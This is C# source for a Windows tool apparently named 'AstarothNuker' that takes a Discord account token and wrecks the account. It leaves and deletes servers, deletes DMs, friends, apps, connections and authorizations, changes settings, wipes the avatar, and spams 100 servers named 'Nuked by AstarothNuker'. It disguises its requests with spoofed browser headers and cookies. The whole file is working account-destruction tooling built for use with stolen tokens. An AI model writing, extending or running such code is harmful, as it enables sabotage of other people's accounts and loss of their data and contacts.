using Discord;
using Discord.Gateway;
using System.Threading;
using System;
using System.Net.Http;
using System.Net;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using System.Drawing;
using System.Collections.Generic;
using Newtonsoft.Json;

public partial class MainForm : MetroSuite.MetroForm
{
    public static bool nuking;

    [DllImport("psapi.dll")]
    static extern int EmptyWorkingSet(IntPtr hwProc);

    [DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SetProcessWorkingSetSize(IntPtr process, UIntPtr minimumWorkingSetSize, UIntPtr maximumWorkingSetSize);

    public static DiscordSocketClient client;

    public MainForm()
    {
        InitializeComponent();

        CheckForIllegalCrossThreadCalls = false;
        Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.RealTime;
    }

    public static List<string> GetAllDMs(string token)
    {
        try
        {
            Leaf.xNet.HttpRequest request = new Leaf.xNet.HttpRequest();

            request.Proxy = null;
            request.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
            request.EnableMiddleHeaders = false;
            request.KeepTemporaryHeadersOnRedirect = false;
            request.ClearAllHeaders();

            request.AddHeader("Accept-Encoding", "gzip, deflate, br");
            request.AddHeader("Authorization", token);

            List<string> dms = new List<string>();
            string response = Utils.DecompressResponse(request.Get("https://discord.com/api/v9/users/@me/channels"));

            dynamic jss = JsonConvert.DeserializeObject(response);

            foreach (var item in jss)
            {
                try
                {
                    dms.Add((string)item.id);
                }
                catch
                {

                }
            }

            return dms;
        }
        catch
        {
            return new List<string>();
        }
    }

    public static void DeleteDMChannel(string token, string id)
    {
        try
        {
            Leaf.xNet.HttpRequest request = new Leaf.xNet.HttpRequest();

            request.Proxy = null;
            request.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
            request.EnableMiddleHeaders = false;
            request.KeepTemporaryHeadersOnRedirect = false;
            request.ClearAllHeaders();

            request.AddHeader("Accept-Encoding", "gzip, deflate, br");
            request.AddHeader("Authorization", token);

            List<string> dms = new List<string>();
            request.Delete("https://discord.com/api/v9/channels/" + id);
        }
        catch
        {

        }
    }

    public static void DeleteAvatar(string token)
    {
        try
        {
            Leaf.xNet.HttpRequest request = new Leaf.xNet.HttpRequest();

            request.Proxy = null;
            request.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
            request.EnableMiddleHeaders = false;
            request.KeepTemporaryHeadersOnRedirect = false;
            request.ClearAllHeaders();

            string content = "{\"avatar\":null}";

            request.AddHeader("Accept", "*/*");
            request.AddHeader("Accept-Encoding", "gzip, deflate, br");
            request.AddHeader("Accept-Language", "it");
            request.AddHeader("Authorization", token);
            request.AddHeader("Connection", "keep-alive");
            request.AddHeader("Content-Length", content.Length.ToString());
            request.AddHeader("Content-Type", "application/json");
            request.AddHeader("Cookie", Utils.GetRandomCookie());
            request.AddHeader("DNT", "1");
            request.AddHeader("Host", "discord.com");
            request.AddHeader("Origin", "https://discord.com");
            request.AddHeader("Referer", "https://discord.com/channels/@me");
            request.AddHeader("TE", "Trailers");
            request.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0");
            request.AddHeader("X-Super-Properties", "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJpdC1JVCIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2Ojg4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvODguMCIsImJyb3dzZXJfdmVyc2lvbiI6Ijg4LjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODU3MTIsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9");

            request.Patch("https://discord.com/api/v9/users/@me", content, "application/json");
        }
        catch
        {

        }
    }

    public static void ChangeTheme(string token)
    {
        try
        {
            Leaf.xNet.HttpRequest request = new Leaf.xNet.HttpRequest();

            request.Proxy = null;
            request.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
            request.EnableMiddleHeaders = false;
            request.KeepTemporaryHeadersOnRedirect = false;
            request.ClearAllHeaders();

            string content = "{\"theme\":\"light\"}";

            request.AddHeader("Accept", "*/*");
            request.AddHeader("Accept-Encoding", "gzip, deflate, br");
            request.AddHeader("Accept-Language", "it");
            request.AddHeader("Authorization", token);
            request.AddHeader("Connection", "keep-alive");
            request.AddHeader("Content-Length", content.Length.ToString());
            request.AddHeader("Content-Type", "application/json");
            request.AddHeader("Cookie", Utils.GetRandomCookie());
            request.AddHeader("DNT", "1");
            request.AddHeader("Host", "discord.com");
            request.AddHeader("Origin", "https://discord.com");
            request.AddHeader("Referer", "https://discord.com/channels/@me");
            request.AddHeader("TE", "Trailers");
            request.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0");
            request.AddHeader("X-Super-Properties", "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJpdC1JVCIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2Ojg4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvODguMCIsImJyb3dzZXJfdmVyc2lvbiI6Ijg4LjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODU3MTIsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9");

            request.Patch("https://discord.com/api/v9/users/@me/settings", content, "application/json");
        }
        catch
        {

        }
    }

    public static void ChangeLanguage(string token)
    {
        try
        {
            Leaf.xNet.HttpRequest request = new Leaf.xNet.HttpRequest();

            request.Proxy = null;
            request.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
            request.EnableMiddleHeaders = false;
            request.KeepTemporaryHeadersOnRedirect = false;
            request.ClearAllHeaders();

            string content = "{\"locale\":\"ja\"}";

            request.AddHeader("Accept", "*/*");
            request.AddHeader("Accept-Encoding", "gzip, deflate, br");
            request.AddHeader("Accept-Language", "it");
            request.AddHeader("Authorization", token);
            request.AddHeader("Connection", "keep-alive");
            request.AddHeader("Content-Length", content.Length.ToString());
            request.AddHeader("Content-Type", "application/json");
            request.AddHeader("Cookie", Utils.GetRandomCookie());
            request.AddHeader("DNT", "1");
            request.AddHeader("Host", "discord.com");
            request.AddHeader("Origin", "https://discord.com");
            request.AddHeader("Referer", "https://discord.com/channels/@me");
            request.AddHeader("TE", "Trailers");
            request.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0");
            request.AddHeader("X-Super-Properties", "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJpdC1JVCIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2Ojg4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvODguMCIsImJyb3dzZXJfdmVyc2lvbiI6Ijg4LjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODU3MTIsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9");

            request.Patch("https://discord.com/api/v9/users/@me/settings", content, "application/json");
        }
        catch
        {

        }
    }

    public static void ChangePrivacy(string token)
    {
        try
        {
            Leaf.xNet.HttpRequest request = new Leaf.xNet.HttpRequest();

            request.Proxy = null;
            request.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
            request.EnableMiddleHeaders = false;
            request.KeepTemporaryHeadersOnRedirect = false;
            request.ClearAllHeaders();

            string content = "{\"explicit_content_filter\":0}";

            request.AddHeader("Accept", "*/*");
            request.AddHeader("Accept-Encoding", "gzip, deflate, br");
            request.AddHeader("Accept-Language", "it");
            request.AddHeader("Authorization", token);
            request.AddHeader("Connection", "keep-alive");
            request.AddHeader("Content-Length", content.Length.ToString());
            request.AddHeader("Content-Type", "application/json");
            request.AddHeader("Cookie", Utils.GetRandomCookie());
            request.AddHeader("DNT", "1");
            request.AddHeader("Host", "discord.com");
            request.AddHeader("Origin", "https://discord.com");
            request.AddHeader("Referer", "https://discord.com/channels/@me");
            request.AddHeader("TE", "Trailers");
            request.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0");
            request.AddHeader("X-Super-Properties", "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJpdC1JVCIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2Ojg4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvODguMCIsImJyb3dzZXJfdmVyc2lvbiI6Ijg4LjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODU3MTIsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9");

            request.Patch("https://discord.com/api/v9/users/@me/settings", content, "application/json");
        }
        catch
        {

        }
    }

    public static bool IsPhoneNull(string token)
    {
        try
        {
            Leaf.xNet.HttpRequest request = new Leaf.xNet.HttpRequest();

            request.Proxy = null;
            request.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
            request.EnableMiddleHeaders = false;
            request.KeepTemporaryHeadersOnRedirect = false;
            request.ClearAllHeaders();

            request.AddHeader("Accept-Encoding", "gzip, deflate, br");
            request.AddHeader("Authorization", token);

            List<string> dms = new List<string>();
            string response = Utils.DecompressResponse(request.Get("https://discord.com/api/v9/users/@me"));

            dynamic jss = Newtonsoft.Json.Linq.JObject.Parse(response);

            if (jss.phone == null)
            {
                return true;
            }

            return false;
        }
        catch
        {
            return true;
        }
    }

    public static bool checkToken(string token)
    {
        try
        {
            if ((token.Length != 59 && token.Length != 88) || (token == ""))
            {
                return false;
            }

            if (token.Length == 59)
            {
                try
                {
                    string decoded = Base64Decode(token.Substring(0, 24));

                    if (!Microsoft.VisualBasic.Information.IsNumeric(decoded) || decoded.Length != 18)
                    {
                        return false;
                    }
                }
                catch
                {
                    return false;
                }
            }

            var http = new HttpClient();

            try
            {
                var request = new HttpRequestMessage
                {
                    RequestUri = new Uri("https://discord.com/api/v8/users/@me/library"),
                    Method = HttpMethod.Get,
                    Headers = { { HttpRequestHeader.Authorization.ToString(), token }, { HttpRequestHeader.ContentType.ToString(), "multipart/mixed" }, },
                };

                if (http.SendAsync(request).Result.StatusCode.Equals(HttpStatusCode.OK))
                {
                    return true;
                }

                return false;
            }
            catch
            {
                return false;
            }
        }
        catch
        {
            return false;
        }
    }

    public static string Base64Decode(string base64EncodedData)
    {
        return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(base64EncodedData));
    }

    private void metroButton1_Click(object sender, System.EventArgs e)
    {
        try
        {
            new Thread(startNuke).Start();
        }
        catch
        {

        }
    }

    public void startNuke()
    {
        try
        {
            if (checkToken(metroTextbox1.Text))
            {
                nuking = true;

                metroButton1.Enabled = false;
                metroButton2.Enabled = true;

                new Thread(startNuking).Start();
            }
            else
            {
                MessageBox.Show("Invalid token!", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        catch
        {
            MessageBox.Show("Failed start nuking!", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }

    public void startNuking()
    {
        try
        {
            DiscordSocketConfig config = new DiscordSocketConfig();

            config.RetryOnRateLimit = true;
            config.ApiVersion = 8;

            client = new DiscordSocketClient(config);

            client.OnLoggedIn += Client_OnLoggedIn;
            client.Login(metroTextbox1.Text);
        }
        catch
        {

        }
    }

    public static void leaveServers()
    {
        try
        {
            foreach (PartialGuild guild in client.GetGuilds())
            {
                if (nuking)
                {
                    try
                    {
                        new Thread(() => leaveServer(guild)).Start();
                    }
                    catch
                    {

                    }
                }
            }
        }
        catch
        {

        }
    }
    public static void leaveServer(PartialGuild guild)
    {
        try
        {
            if (nuking)
            {
                guild.Leave();
            }
        }
        catch
        {

        }
    }

    public static void deleteServers()
    {
        try
        {
            foreach (PartialGuild guild in client.GetGuilds())
            {
                if (nuking)
                {
                    try
                    {
                        new Thread(() => deleteServer(guild)).Start();
                    }
                    catch
                    {

                    }
                }
            }
        }
        catch
        {

        }
    }

    public static void deleteServer(PartialGuild guild)
    {
        try
        {
            if (nuking)
            {
                if (guild.Owner)
                {
                    guild.Delete();
                }
            }
        }
        catch
        {

        }
    }



    public static void deleteDMs()
    {
        try
        {
            foreach (string id in GetAllDMs(client.Token))
            {
                if (nuking)
                {
                    new Thread(() => deleteDM(id)).Start();
                }
            }
        }
        catch
        {

        }
    }

    public static void deleteDM(string id)
    {
        try
        {
            if (nuking)
            {
                DeleteDMChannel(client.Token, id);
            }
        }
        catch
        {

        }
    }


    public static void deleteRelationships()
    {
        try
        {
            foreach (DiscordRelationship relationship in client.GetRelationships())
            {
                if (nuking)
                {
                    new Thread(() => removeRelationship(relationship)).Start();
                }
            }
        }
        catch
        {

        }
    }

    public static void removeRelationship(DiscordRelationship relationship)
    {
        try
        {
            if (nuking)
            {
                relationship.Remove();
            }
        }
        catch
        {

        }
    }

    public static void deleteApplications()
    {
        try
        {
            foreach (OAuth2Application application in client.GetApplications())
            {
                if (nuking)
                {
                    new Thread(() => deleteApplication(application)).Start();
                }
            }
        }
        catch
        {

        }
    }

    public static void deleteApplication(OAuth2Application application)
    {
        try
        {
            if (nuking)
            {
                application.Delete();
            }
        }
        catch
        {

        }
    }

    public static void deleteConnectedAccounts()
    {
        try
        {
            foreach (ClientConnectedAccount connection in client.GetConnectedAccounts())
            {
                if (nuking)
                {
                    new Thread(() => deleteConnectedAccount(connection)).Start();
                }
            }
        }
        catch
        {

        }
    }

    public static void deleteConnectedAccount(ClientConnectedAccount account)
    {
        try
        {
            if (nuking)
            {
                account.Remove();
            }
        }
        catch
        {

        }
    }

    public static void createServers()
    {
        try
        {
            for (int i = 0; i < 100; i++)
            {
                try
                {
                    if (nuking)
                    {
                        new Thread(() => createServer()).Start();
                    }
                }
                catch
                {

                }
            }
        }
        catch
        {

        }
    }

    public static void createServer()
    {
        try
        {
            if (nuking)
            {
                client.CreateGuild("Nuked by AstarothNuker");
            }
        }
        catch
        {

        }
    }

    public static void deletePaymentMethods()
    {
        try
        {
            foreach (PaymentMethod paymentMethod in client.GetPaymentMethods())
            {
                if (nuking)
                {
                    new Thread(() => deletePaymentMethod(paymentMethod)).Start();
                }
            }
        }
        catch
        {

        }
    }

    public static void deleteAuthorizedApps()
    {
        try
        {
            foreach (AuthorizedApp authorizedApp in client.GetAuthorizedApps())
            {
                if (nuking)
                {
                    new Thread(() => deleteAuthorizedApp(authorizedApp)).Start();
                }
            }
        }
        catch
        {

        }
    }

    public static void deleteAuthorizedApp(AuthorizedApp authorizedApp)
    {
        try
        {
            authorizedApp.Deauthorize();
        }
        catch
        {

        }
    }

    public static void deletePaymentMethod(PaymentMethod paymentMethod)
    {
        try
        {
            if (nuking)
            {
                //paymentMethod.Remove();
            }
            else
            {
                return;
            }
        }
        catch
        {

        }
    }

    private void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
    {
        try
        {
            try
            {
                if (!nuking)
                {
                    return;
                }

                if (metroChecker1.Checked)
                {
                    new Thread(() => leaveServers()).Start();

                    bool foundGuild = true;

                    while (foundGuild)
                    {
                        Thread.Sleep(250);
                        foundGuild = false;

                        foreach (PartialGuild guild in client.GetGuilds())
                        {
                            if (!guild.Owner)
                            {
                                foundGuild = true;

                                break;
                            }
                        }
                    }
                }

                if (!nuking)
                {
                    return;
                }

                if (metroChecker2.Checked)
                {
                    new Thread(() => deleteServers()).Start();
                }

                if (!nuking)
                {
                    return;
                }

                if (metroChecker3.Checked)
                {
                    new Thread(() => deleteDMs()).Start();

                    bool foundGuild = true;

                    while (foundGuild)
                    {
                        Thread.Sleep(250);
                        foundGuild = false;

                        foreach (string id in GetAllDMs(client.Token))
                        {
                            foundGuild = true;

                            break;
                        }
                    }
                }

                if (!nuking)
                {
                    return;
                }

                if (metroChecker4.Checked)
                {
                    new Thread(() => deleteRelationships()).Start();

                    bool foundGuild = true;

                    while (foundGuild)
                    {
                        Thread.Sleep(250);
                        foundGuild = false;

                        foreach (DiscordRelationship guild in client.GetRelationships())
                        {
                            foundGuild = true;

                            break;
                        }
                    }
                }

                if (!nuking)
                {
                    return;
                }

                if (metroChecker5.Checked)
                {
                    new Thread(() => deleteApplications()).Start();

                    bool foundGuild = true;

                    while (foundGuild)
                    {
                        Thread.Sleep(250);
                        foundGuild = false;

                        foreach (OAuth2Application guild in client.GetApplications())
                        {
                            foundGuild = true;

                            break;
                        }
                    }
                }

                if (!nuking)
                {
                    return;
                }

                if (metroChecker6.Checked)
                {
                    new Thread(() => deleteConnectedAccounts()).Start();

                    bool foundGuild = true;

                    while (foundGuild)
                    {
                        Thread.Sleep(250);
                        foundGuild = false;

                        foreach (ClientConnectedAccount guild in client.GetConnectedAccounts())
                        {
                            foundGuild = true;

                            break;
                        }
                    }
                }

                if (!nuking)
                {
                    return;
                }

                if (metroChecker7.Checked)
                {
                    try
                    {
                        if (nuking)
                        {
                            ChangeLanguage(client.Token);
                        }
                        else
                        {
                            return;
                        }
                    }
                    catch
                    {

                    }
                }

                if (!nuking)
                {
                    return;
                }

                if (metroChecker8.Checked)
                {
                    try
                    {
                        if (nuking)
                        {
                            ChangeTheme(client.Token);
                        }
                        else
                        {
                            return;
                        }
                    }
                    catch
                    {

                    }
                }

                if (!nuking)
                {
                    return;
                }

                if (metroChecker9.Checked)
                {
                    try
                    {
                        if (nuking)
                        {
                            ChangePrivacy(client.Token);
                        }
                        else
                        {
                            return;
                        }
                    }
                    catch
                    {

                    }
                }

                if (!nuking)
                {
                    return;
                }

                if (metroChecker10.Checked)
                {
                    new Thread(() => createServers()).Start();

                    bool foundGuild = true;

                    while (foundGuild)
                    {
                        foundGuild = false;
                        int guilds = 0;

                        foreach (PartialGuild guild in client.GetGuilds())
                        {
                            try
                            {
                                guilds++;
                            }
                            catch
                            {

                            }
                        }

                        if (guilds < 99)
                        {
                            foundGuild = true;
                        }
                    }
                }

                if (!nuking)
                {
                    return;
                }

                if (metroChecker13.Checked)
                {
                    new Thread(() => deletePaymentMethods()).Start();

                    bool foundGuild = true;

                    while (foundGuild)
                    {
                        Thread.Sleep(250);
                        foundGuild = false;

                        foreach (PaymentMethod guild in client.GetPaymentMethods())
                        {
                            foundGuild = true;

                            break;
                        }
                    }
                }

                if (!nuking)
                {
                    return;
                }

                if (metroChecker14.Checked)
                {
                    new Thread(() => deleteAuthorizedApps()).Start();

                    bool foundGuild = true;

                    while (foundGuild)
                    {
                        Thread.Sleep(250);
                        foundGuild = false;

                        foreach (AuthorizedApp guild in client.GetAuthorizedApps())
                        {
                            foundGuild = true;

                            break;
                        }
                    }
                }

                if (!nuking)
                {
                    return;
                }

                if (metroChecker12.Checked)
                {
                    try
                    {
                        DeleteAvatar(client.Token);
                    }
                    catch
                    {

                    }
                }

                if (!nuking)
                {
                    return;
                }

                if (metroChecker11.Checked && IsPhoneNull(client.Token))
                {
                    try
                    {
                        try
                        {
                            foreach (PartialGuild guild in client.GetGuilds())
                            {
                                if (metroChecker11.Checked)
                                {
                                    try
                                    {
                                        guild.Leave();
                                    }
                                    catch
                                    {

                                    }

                                    try
                                    {
                                        guild.Delete();
                                    }
                                    catch
                                    {

                                    }

                                    break;
                                }
                            }
                        }
                        catch
                        {

                        }

                        if (metroChecker11.Checked)
                        {
                            if (nuking)
                            {
                                client.JoinGuild("NXk4rE5jFA");
                            }
                            else
                            {
                                return;
                            }
                        }
                    }
                    catch
                    {

                    }
                }

                nuking = false;
            }
            catch
            {

            }
        }
        catch
        {

        }
    }

    private void metroButton2_Click(object sender, System.EventArgs e)
    {
        try
        {
            nuking = false;

            metroButton2.Enabled = false;
            metroButton1.Enabled = true;
        }
        catch
        {

        }
    }

    private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
    {
        try
        {
            Process.GetCurrentProcess().Kill();
        }
        catch
        {

        }
    }

    private void pictureBox24_Click(object sender, System.EventArgs e)
    {
        Process.GetCurrentProcess().Kill();
    }

    private void pictureBox22_Click(object sender, System.EventArgs e)
    {
        WindowState = FormWindowState.Minimized;
    }

    private void pictureBox24_MouseEnter(object sender, System.EventArgs e)
    {
        pictureBox24.Size = new Size(18, 18);
    }

    private void pictureBox24_MouseLeave(object sender, System.EventArgs e)
    {
        pictureBox24.Size = new Size(20, 20);
    }

    private void pictureBox22_MouseEnter(object sender, System.EventArgs e)
    {
        pictureBox22.Size = new Size(18, 18);
    }

    private void pictureBox22_MouseLeave(object sender, System.EventArgs e)
    {
        pictureBox22.Size = new Size(20, 20);
    }
}